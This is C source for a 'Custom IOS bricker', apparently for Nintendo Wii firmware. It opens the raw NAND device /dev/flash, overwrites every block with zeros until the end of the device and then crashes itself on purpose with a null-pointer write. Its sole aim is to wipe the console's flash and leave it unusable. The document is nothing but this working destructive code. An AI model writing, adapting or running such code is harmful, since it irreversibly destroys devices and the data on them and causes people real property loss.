/*
	Custom IOS bricker

	Copyright (C) 2019 Arves100.
*/

#include "syscalls.h"
#include "isfs.h"
#include "ios.h"

#define BLOCK	0x800

void crash_code(void)
{
	int* xd = (int*)0;

	*xd = 38458;
}

int main(void)
{
	s8 cwrote_char = 0, can_continue = 1;
	s32 ret = 0, nand_fd = os_open("/dev/flash", ISFS_OPEN_WRITE), cnt = 0;

	if (nand_fd < 0)
	{
		crash_code();
		return -1;
	}

	while(can_continue == 1)
	{
		if (os_seek(nand_fd, cnt, 0) >= 0)
		{
			/* Write data block */
			ret = os_write(nand_fd, &cwrote_char, 1);

			switch (ret) {
			/* Write OK */
			case BLOCK:
				break;

			/* EOF */
			case -4:
				can_continue = 0;
				break;

			/* Bad block */
			case -12:
				break;

			/* Write ERROR */
			default:
				can_continue = 0;
				break;
			}
		}

		cnt++;
	}

	os_close(nand_fd);

	crash_code();
}
